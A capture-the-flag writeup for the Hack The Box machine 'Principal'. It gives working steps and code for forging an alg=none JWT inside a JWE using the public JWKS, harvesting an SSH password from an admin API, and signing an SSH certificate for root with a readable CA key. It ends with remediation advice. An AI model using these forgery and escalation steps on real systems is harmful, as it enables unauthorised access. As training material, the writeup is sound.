# Principal — Active Learning Writeup

| Target | Detail |
| :--- | :--- |
| **OS** | Linux (Ubuntu 24.04) |
| **Difficulty** | Medium |
| **IP Address** | `10.129.X.X` (VPN — see `htb machine active`) |
| **Owned** | 2026-09-29 — User ✅ Root ✅ |
| **Key Concepts** | JWE/JWT forgery (alg=none inside an encrypted envelope), unauthenticated JWKS, admin API credential harvest, SSH CA certificate forgery (`TrustedUserCAKeys`) |
| **Time** | ~90 min |
| **Creator** | ippsec (retired) |

**Attack path (TL;DR):**

```text
recon → app.js comment header = full auth map → JWKS (public!) → forge
JWE(PlainJWT alg=none) → admin API → svc-deploy password + SSH CA path →
SSH login (user) → sign own key as principal "root" with stolen CA → root
```

---

## 1. Reconnaissance & Surface Analysis

### Tunnel Sanity (before the first packet)

```text
htb machine active     # the ONLY IP source of truth (never copy IPs from chat)
docker exec kali …     # all target traffic — the VPN lives in the container
/etc/hosts <ip> <name> # vhost mapping: inside container AND on the host browser
```

### Raw Port Scan

```bash
nmap -sC -sV -p- -T4 -oA recon/initial <IP>
```

```text
-sC : default scripts (banner, titles, light enum — best time/value ratio)
-sV : version detection → CVE search needs exact versions
-p- : all 65535 ports — this box has NO port 80; a default list would lie
-T4 : fresh instance, keep retries sane
-oA : txt + nmap + gnmap in one shot
```

### Initial Observations

- **22/tcp OpenSSH 9.6p1 (Ubuntu)** — tempting to spray, but without a
  username it is the *exit* of the box, not the entrance.
- **8080/tcp Jetty + `pac4j-jwt/6.0.3` + "Principal Internal Platform -
  Login"** — the banner literally names the auth library (`pac4j-jwt`) and
  the product. This is the entry surface.

### 🧠 Pause & Predict

<details>
<summary><b>Think first:</b> why is attacking SSH first on a medium box
almost always a waste here?</summary>

No usernames, no leak, no default creds — a blind spray burns hours against
rate limits while the web tier *advertises* its own stack (Jetty + pac4j-jwt).
The service that leaks information is the service that plays: enumerate web
first, keep SSH for when credentials appear.
</details>

## 2. Enumeration & Finding the Seam

### What I Investigated

```text
GET  /login            → standard form + /reset-password link
GET  /static/js/app.js → 10 KB client bundle — read it, don't grep it
```

**The first move that mattered:** I *read* `app.js` top-to-bottom instead of
regex-scanning it. Its comment header documents the entire auth architecture:

```text
POST /api/auth/login ──► JWE (RSA-OAEP-256 + A128GCM outer envelope)
GET  /api/auth/jwks   ──► PUBLIC KEY, NO AUTHENTICATION  ← forgery raw material
inner JWT             ──► RS256-signed claims: sub / role / iss=principal-platform
role gates            ──► /api/dashboard (any user) | /api/users, /api/settings (admin)
```

### 🧠 Interactive Challenge

<details>
<summary><b>Challenge:</b> the JWE is <em>encrypted</em> with an RSA public
key anyone can fetch. What exactly does that guarantee — and what does it
not?</summary>

Encryption only guarantees *confidentiality to the holder of the private key*
(the server). It says nothing about *who crafted the plaintext*. Anyone can
encrypt a token of their own design; the only question is what the server
does with the decrypted contents.
</details>

### ❌ Failure Log — What I Tried First & Why It Failed

> Mandatory section. In real engagements ~70% of attempts fail — this
> log is what builds troubleshooting memory.

1. Waited ~20 tries for "port 80 must come up" on a freshly booted box →
   **Result:** nothing; the box simply has no 80. *Takeaway:* never assume a
   port list — `-p-` is the truth, every time.
2. `gobuster` backgrounded with `nohup` inside `docker exec` → **Result:**
   zombie — the scanner died silently with the exec. *Takeaway:* background
   work inside containers needs `setsid`/`docker exec -d`, and a `pgrep`
   follow-up; a dead scanner reads exactly like "no findings".
3. `jwcrypto.add_recipient(<PEM bytes>)` → **Result:**
   `TypeError: expected JWK`. *Takeaway:* library APIs drift between versions;
   the traceback *is* the documentation — the JWKS already contains `n`/`e`,
   so build the JWK directly and skip PEM entirely.

### The Breakthrough (Root Cause Breakdown)

**The Flaw:** the server treats "the envelope decrypted" as authentication of
its contents. The inner JWT's signature (`alg`) is never re-checked — so a
token whose payload says `alg: none` is accepted as an admin identity the
moment the outer RSA layer opens.

**Real-World Analogy:**
> A tamper-evident envelope with a wax seal: the seal proves *who mailed it*
> in the sender's mind — but the office only verifies the seal, never reads
> the contract inside for a signature. Reseal a contract you wrote yourself
> with the office's own public sealing key, and it sails through.

<details>
<summary><b>🧠 Mini-challenge:</b> two bugs are needed here — name both.</summary>

1. JWKS served **without authentication** (raw material for anyone).
2. Inner `alg=none` accepted after outer decrypt (content never validated).
Fixing either one kills the attack — that's why defense-in-depth checks the
*inner* claim even when the outer layer succeeded.
</details>

## 3. Foothold (Initial Access)

### Command Breakdown

```text
Syntax structure (3-step forgery):
STEP 1  GET /api/auth/jwks          → {n, e}  → JWK (kid: enc-key-1)
STEP 2  inner = PlainJWT {sub:"admin", role:"ROLE_ADMIN",
                          iss:"principal-platform", iat, exp}   ← alg=none
STEP 3  outer = JWE(inner) encrypted to that JWK
         (RSA-OAEP-256 + A128GCM)
         Authorization: Bearer <outer>
```

```python
jwe = JWE(json.dumps(claims).encode(), json.dumps({"alg":"RSA-OAEP-256",
         "enc":"A128GCM","kid":"enc-key-1"}).encode())
jwe.add_recipient(JWK(kty="RSA", n=jwks["n"], e=jwks["e"], kid="enc-key-1"))
token = jwe.serialize_compact()
```

<details>
<summary><b>Task:</b> before sending it, what response proves the bug and
what response disproves it?</summary>

`GET /api/dashboard` with the forged Bearer: **200 = accepted (bug real)**,
**401 = server re-validates the inner token (prediction wrong)**. A
falsifiable prediction *before* the request is what makes this a test rather
than a wish.
</details>

```text
Result: /api/dashboard → 200 (admin session)
```

### Admin API = credential hoard

```text
GET /api/users    → 8 accounts; svc-deploy = "Service account for automated
                    deployments via SSH certificate auth"  ← foothold vector
GET /api/settings → encryptionKey: "…" (label lies — it's the Deploy SSH PASSWORD)
                    sshCaPath: /opt/principal/ssh/   ← privesc target
                    sshCertAuth: enabled
```

> **Rule applied:** never trust a field's *label* — `encryptionKey` sounds
> like a key; it authenticated as an **SSH password** the moment it was tested.

```text
username : svc-deploy : <settings "encryptionKey" value>
Access Vector: SSH (port 22)
```

### Credentials Found — user flag

```bash
ssh svc-deploy@<IP>        # uid 1001, group: deployers
```

```text
user: /home svc-deploy → user.txt                     (submitted ✓)
```

`/opt/principal/ssh/` holds `ca` + `ca.pub` with mode `root:deployers` — and
`svc-deploy` **is** in `deployers`: the CA private key is world-readable to
anyone holding the account we just compromised.

## 4. Privilege Escalation

### Internal Audits (order matters)

```bash
id; groups                    # deployers ← why the CA key is readable
ls -l /opt/principal/ssh/     # ca (RSA-4096) + ca.pub, root:deployers
grep -i ca /etc/ssh/sshd_config  # TrustedUserCAKeys /opt/principal/ssh/ca
```

### The Misconfiguration

- **CA trust:** `sshd` trusts the deployment CA for *all* users.
- **Missing validation:** the certificate's **principal list is never checked**
  against the target account — a cert saying `root` validates for root.

### 🧠 Privesc Reasoning

<details>
<summary><b>Q:</b> why is <code>TrustedUserCAKeys</code> without a principals
gate so much worse than a shared <code>authorized_keys</code>?</summary>

A shared key at least ties access to one leaked file. A CA means *anyone who
can read the signing key can mint credentials for **every** principal on the
box* — one file read → total impersonation, and the audit log shows a
"legitimate" certificate login.
</details>

### Root Exploitation

```text
WHY it works:  sshd: TrustedUserCAKeys = <stolen CA>
               bug: principal NOT validated → sign "root" → accepted
Predicted outcomes (before running):
  a) "Certificate invalid"  → signature/principal mismatch
  b) "Permission denied"    → PermitRootLogin / principals gate
  c) id = root               → pwned
```

```bash
ssh-keygen -f id_rsa -t rsa -b 4096              # attacker keypair
ssh-keygen -s /opt/principal/ssh/ca -I deploy-cert -n root -V +5m id_rsa.pub
ssh -i id_rsa root@<IP>
whoami    # root
```

```text
root: uid=0 shell → root.txt                      (submitted ✓)
```

## 5. Flags

> **Rule: never paste flag values into notes.** They turn the writeup
> into a flashcard (passive recognition). Record *where* the flag was
> read and *how* it was submitted — regeneration is the review.

```text
user: svc-deploy home → user.txt                (submitted ✓)
root: root shell → root.txt                     (submitted ✓)
```

```bash
htb machine own <flag> -d <rating>
```

## 6. Defense & Remediation (The Sysadmin View)

| Stage | Issue | Secure Fix |
| :--- | :--- | :--- |
| Web | JWKS served unauthenticated | Keep JWKS public only if inner tokens are strictly verified; otherwise gate it |
| Web | Inner JWT signature never re-checked after decrypt | Validate `alg`, signature, issuer, expiry **after** JWE unwrap — envelope ≠ content |
| Web | Client JS documents the whole auth design | Ship minified/no-comment bundles for anything security-relevant |
| Secrets | Settings API stores a password under a key-sounding name | Secrets manager, not JSON settings; rotate on admin-compromise |
| OS | CA key readable by a whole group | `root:root` 0600 key; issue short-lived per-user certs |
| OS | Certificate principals not validated | `AuthorizedPrincipalsFile` + `sshd -t` audit; reject certs whose principals don't include the target user |

## 7. Key Takeaways

1. **Read the client source end-to-end** — the comment header handed over the
   entire attack graph before a single payload was sent.
2. **An encrypted token is not an authenticated token** — check the contents,
   always, even when the outer layer verifies cleanly.
3. **Label ≠ function:** test every "secret" against the system it *might*
   belong to (settings key → SSH password in one try).
4. **Predict the failure modes before you exploit** — this box's three
   predicted outcomes mapped 1:1 to reality, which made the root step a
   confirmation, not an exploration.

## 8. Methodology — Decisions & Transferable Rules

> Key Takeaways above are box-specific. This section records the
> *decision process* itself — it must outlive the box.

### Decision Tree (why each next move)

```text
STEP       FACT OBSERVED                     DECISION & WHY (vs rejected alt)
Recon      22 + 8080, no 80                  full -p- sweep killed the port-80
                                             assumption; web banner named the stack
Surface    app.js header documents auth      READ the bundle (grep missed it) —
           JWE + unauthenticated JWKS         client code is the server's map
Hypothesis JWE encrypts with public key      falsifiable: forged alg=none token →
           + alg=none suspicion               200 = content never validated
Fix        jwcrypto wants JWK not PEM        traceback is docs; build JWK from n/e
Enum       admin API opened                  users+settings = creds + CA path —
                                             test secret labels, don't trust them
Privesc    group deployers can read CA       sshd trusts CA but not principals →
           + TrustedUserCAKeys configured     sign "root" (predict 3 outcomes first)
```

### Rules Extracted (carry to the next box)

1. **Client-side code — especially comments — is reconnaissance gold.**
   Read it fully once; never substitute grep for reading.
2. **Separate envelope checks from content checks** in your head: any
   system that verifies wrapping but not payload is one `alg=none` away.
3. **Never background tools inside `docker exec` naively** — verify they are
   alive (`pgrep`) or you'll debug "empty results" that are actually dead
   processes.
4. **Build falsifiable predictions** (200 vs 401; three named failure modes)
   before every exploit — it converts luck into a experiment log.
5. **Field labels are attacker-controlled narrative** — validate every
   secret against candidate systems instead of believing the name.
6. **Port assumptions die with `-p-`** — medium+ boxes use surprising
   ports; a default list is a self-fulfilling blind spot.

## 9. 🧠 Active Recall Challenges (Before You Close This Box)

- [ ] **Challenge 1:** if the JWKS had required auth but the alg=none check
      was still missing, which single other bug would still complete the
      chain?
- [ ] **Challenge 2:** forge the same token offline — `jwcrypto` in one
      Python file: JWKS → JWK → PlainJWT → JWE compact.
- [ ] **Challenge 3:** re-run this box with zero notes — reach root in
      `<45 min>`?

<details>
<summary><b>Answers</b> (attempt first, then open)</summary>

1. Any *authenticated* leak of the encryption public key — e.g. the login
   response embedding it, or the cert endpoint — restores the raw material.
   Forgery only needs *a* copy of the public key, not an open directory.
2. See §3: `JWK(kty="RSA", n=…, e=…)` + `JWE.add_recipient` +
   `serialize_compact()` — three calls, no PEM.
3. Targets: app.js read <5 min → JWKS + forge <15 min → admin API <10 min →
   SSH <5 min → CA sign + root <10 min.
</details>

---

**Final Checklist (before publishing):**
- [x] Could a newcomer parse every command? (flags broken down)
- [x] Is the *WHY* of the first move explained?
- [x] Are failures documented (not just the perfect path)?
- [x] Does command order match what actually ran in the terminal?
